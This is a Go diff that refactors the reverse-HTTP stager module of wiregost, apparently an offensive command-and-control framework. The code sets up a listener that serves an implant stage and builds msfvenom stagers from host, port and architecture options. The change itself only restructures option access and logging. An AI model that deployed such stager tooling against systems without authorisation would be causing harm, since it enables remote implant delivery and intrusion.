@@ -38,39 +38,23 @@ import (
 	"github.com/maxlandon/wiregost/server/module/templates"
 )
 
-// metadataFile - Full path to module metadata
-var metadataFile = filepath.Join(assets.GetModulesDir(), "payload/multi/stager/reverse_http/metadata.json")
-
 // [ Base Methods ] ------------------------------------------------------------------------//
 
 // ReverseHTTPStager - A single stage MTLS implant
 type ReverseHTTPStager struct {
-	Base *templates.Module
+	*templates.Module
 }
 
 // New - Instantiates a reverse MTLS module, empty.
 func New() *ReverseHTTPStager {
-	return &ReverseHTTPStager{Base: &templates.Module{}}
+	mod := &ReverseHTTPStager{&templates.Module{}}
+	mod.Path = []string{"payload/multi/stager/reverse_http"}
+	return mod
 }
 
-// Init - Module initialization, loads metadata. ** DO NOT ERASE **
-func (s *ReverseHTTPStager) Init() error {
-	return s.Base.Init(metadataFile)
-}
-
-// ToProtobuf - Returns protobuf version of module
-func (s *ReverseHTTPStager) ToProtobuf() *pb.Module {
-	return s.Base.ToProtobuf()
-}
-
-// SetOption - Sets a module option through its base object.
-func (s *ReverseHTTPStager) SetOption(option, name string) {
-	s.Base.SetOption(option, name)
-}
+var modLog = log.ServerLogger("payload/multi/stager/reverse_http", "module")
 
 // [ Module Methods ] ------------------------------------------------------------------------//
-
-var rpcLog = log.ServerLogger("stager_reverse_tcp", "module")
 
 // Run - Module entrypoint. ** DO NOT ERASE **
 func (s *ReverseHTTPStager) Run(command string) (result string, err error) {
@@ -88,11 +72,11 @@ func (s *ReverseHTTPStager) Run(command string) (result string, err error) {
 }
 
 func (s *ReverseHTTPStager) toListener() (result string, err error) {
-	host := s.Base.Options["LHostListener"].Value
+	host := s.Options["LHostListener"].Value
 	if host == "" {
 		return "", errors.New("You must specify a listener LHost")
 	}
-	portUint, err := strconv.Atoi(s.Base.Options["LPortListener"].Value)
+	portUint, err := strconv.Atoi(s.Options["LPortListener"].Value)
 	if err != nil {
 		return "", errors.New("Error parsing listener LPort")
 	}
@@ -102,7 +86,7 @@ func (s *ReverseHTTPStager) toListener() (result string, err error) {
 	}
 
 	// Check StageImplant exists, and is the appropriate format
-	implant := s.Base.Options["StageImplant"].Value
+	implant := s.Options["StageImplant"].Value
 	config := &generate.GhostConfig{}
 	ghostBytes := []byte{}
 	if implant == "" {
@@ -179,7 +163,7 @@ func (s *ReverseHTTPStager) toListener() (result string, err error) {
 	go func() {
 		err := server.HTTPServer.ListenAndServe()
 		if err != nil {
-			rpcLog.Errorf("%s listener error %v", name, err)
+			modLog.Errorf("%s listener error %v", name, err)
 			once.Do(func() { cleanup(err) })
 			job.JobCtrl <- true // Cleanup other goroutine
 		}
@@ -187,7 +171,7 @@ func (s *ReverseHTTPStager) toListener() (result string, err error) {
 
 	go func() {
 		<-job.JobCtrl
-		rpcLog.Infof("Stopping HTTP Stager listener (%d) ...", job.ID)
+		modLog.Infof("Stopping HTTP Stager listener (%d) ...", job.ID)
 		once.Do(func() { cleanup(nil) })
 	}()
 
@@ -197,11 +181,11 @@ func (s *ReverseHTTPStager) toListener() (result string, err error) {
 func (s *ReverseHTTPStager) CompileStager() (result string, err error) {
 
 	// Check options
-	host := s.Base.Options["LHostStager"].Value
+	host := s.Options["LHostStager"].Value
 	if host == "" {
 		return "", errors.New("You must specify a stager LHost")
 	}
-	portUint, err := strconv.Atoi(s.Base.Options["LPortStager"].Value)
+	portUint, err := strconv.Atoi(s.Options["LPortStager"].Value)
 	if err != nil {
 		return "", errors.New("Error parsing stager LPort")
 	}
@@ -209,11 +193,11 @@ func (s *ReverseHTTPStager) CompileStager() (result string, err error) {
 	if port == 0 {
 		return "", errors.New("Invalid stager LPort")
 	}
-	format := s.Base.Options["OutputFormat"].Value
+	format := s.Options["OutputFormat"].Value
 	if format == "" {
 		return "", errors.New("You must specify a MSF Venom output format")
 	}
-	arch := s.Base.Options["Arch"].Value
+	arch := s.Options["Arch"].Value
 	if arch == "" {
 		return "", errors.New("You must specify a CPU architecture for the Stager")
 	}
@@ -226,13 +210,13 @@ func (s *ReverseHTTPStager) CompileStager() (result string, err error) {
 	}
 
 	// If needed, save the payload
-	save := s.Base.Options["FileName"].Value
+	save := s.Options["FileName"].Value
 	if save != "" || format == "raw" {
 		filename := ""
 		if save == "" {
 			// We need a default name, so this code is needed
-			implant := s.Base.Options["StageImplant"].Value
-			configName := s.Base.Options["StageConfig"].Value
+			implant := s.Options["StageImplant"].Value
+			configName := s.Options["StageConfig"].Value
 			config := &generate.GhostConfig{}
 			if configName == "" {
 				if implant == "" {
